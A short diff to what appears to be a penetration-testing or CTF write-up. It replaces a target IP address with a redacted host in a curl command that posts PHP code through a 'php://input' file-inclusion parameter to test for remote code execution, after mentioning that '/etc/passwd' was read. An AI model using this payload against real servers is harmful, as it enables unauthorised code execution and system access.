@@ -48,7 +48,7 @@ And would you look at that, LFI exploit. We just read `/etc/passwd` even though 
 Time to test for RCE:
 
 ```bash
-$ curl "http://3.105.27.130:8080/?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" -d "<?php echo 'abcdefghijklmnopqrstuvwxyz' ?>" | tail -20
+$ curl "http://re.da.ct.ed:8080/?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" -d "<?php echo 'abcdefghijklmnopqrstuvwxyz' ?>" | tail -20
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  1017  100   975  100    42   8757    377 --:--:-- --:--:-- --:--:--  9162
